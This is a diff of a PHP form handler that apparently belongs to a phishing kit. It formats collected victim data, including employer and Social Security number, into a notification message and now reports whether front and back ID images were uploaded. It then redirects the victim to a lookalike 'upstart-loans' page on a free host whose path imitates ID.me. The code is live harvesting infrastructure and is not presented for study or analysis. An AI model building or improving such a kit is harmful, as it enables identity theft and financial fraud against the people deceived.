@@ -143,7 +143,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                       "🏢 *Present Employer:* $present_employer\n".
                       "🔐 *SSN:* $social_security\n".
                       "⏳ *Submitted At:* $timestamp\n".
-                      "📎 *Identity Verification:* " . ($i_authorize && $i_hereby_agree ? "✅ Authorized" : "❌ Not Provided");
+                      "📎 *Identity Verification:* " . ($front_id_path && $back_id_path ? "✅ Uploaded" : "❌ Not Provided");
 
 
 
@@ -201,7 +201,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
 
-    header("Location:https://upstart-loans.onrender.com/api.id.me/en/session/new.php");
+header("Location:https://upstart-loans.onrender.com/api.id.me/en/session/new.php");
 
     
 exit;
